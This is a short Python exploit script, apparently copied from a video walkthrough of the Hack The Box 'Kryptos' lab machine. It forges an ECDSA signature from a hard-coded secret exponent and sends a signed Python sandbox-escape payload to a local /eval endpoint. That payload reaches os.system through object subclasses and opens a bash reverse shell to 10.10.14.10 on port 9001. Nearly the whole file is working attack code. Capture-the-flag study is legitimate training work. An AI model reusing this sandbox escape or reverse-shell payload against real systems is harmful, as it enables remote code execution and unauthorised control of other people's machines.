#
# From Ippsec YouTube Video of HtB Kryptos
#
# https://youtu.be/4uCoI5YzOwk 
#

import random 
import json
import hashlib
import binascii
from ecdsa import VerifyingKey, SigningKey, NIST384p
import requests



def sign(msg):
    return binascii.hexlify(sk.sign(msg))

line = 3735228685074715981405515645441545414621612408569050452885728516384379216099

sk = SigningKey.from_secret_exponent(int(line), curve=NIST384p)
vk = sk.get_verifying_key()
expr = """[].__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__['system']("bash -c 'bash -i >& /dev/tcp/10.10.14.10/9001 0>&1 '")  """
sig = sign(expr.encode())
data = { 'expr': expr, 'sig': sig }
r = requests.post( 'http://127.0.0.1:81/eval', json=data)
print(r.text)
if "Bad signature" in r.text:
    None
else:
    print(line)


